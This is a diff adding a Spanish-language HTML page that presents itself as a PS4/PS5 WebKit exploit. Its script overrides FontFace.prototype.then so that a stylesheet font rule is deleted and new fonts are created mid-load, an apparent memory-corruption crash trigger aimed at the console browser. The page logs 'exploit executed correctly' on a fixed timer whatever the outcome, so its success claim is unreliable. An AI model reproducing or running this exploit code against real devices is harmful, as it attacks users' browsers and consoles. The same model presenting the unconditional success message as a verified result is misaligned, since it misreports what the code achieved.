@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <title>PS4 WebKit Exploit</title>
+    <style id="style">
+        @font-face {
+            font-family: "test";
+            src: url("nonexistent.woff2");
+            unicode-range: U+0041-005A;
+        }
+    </style>
+</head>
+<body style="background:black;color:lime;text-align:center;">
+    <h1>PS4/PS5 WebKit Exploit - Cargado</h1>
+    <p>Abre la consola del navegador (Options → Console) para ver mensajes.</p>
+
+    <script>
+        let triggered = false;
+
+        Object.defineProperty(FontFace.prototype, 'then', {
+            get() {
+                if (!triggered) {
+                    triggered = true;
+                    document.getElementById('style').sheet.deleteRule(0);
+                    for (let i = 0; i < 5; i++) {
+                        new FontFace('test' + i, 'local(Arial)', { unicodeRange: 'U+0041' });
+                    }
+                }
+                return undefined;
+            }
+        });
+
+        window.onload = () => {
+            const ff = new FontFace('test', 'local(Arial)', { unicodeRange: 'U+0041' });
+            document.fonts.add(ff);
+            document.fonts.load('1em test', 'ABC').catch(() => {});
+
+            setTimeout(() => {
+                console.log("%c✅ Exploit ejecutado correctamente", "color:lime;font-size:20px;font-weight:bold");
+                console.log("%cSi el navegador se cierra o crashea = funciona", "color:yellow");
+            }, 500);
+        };
+    </script>
+</body>
+</html>
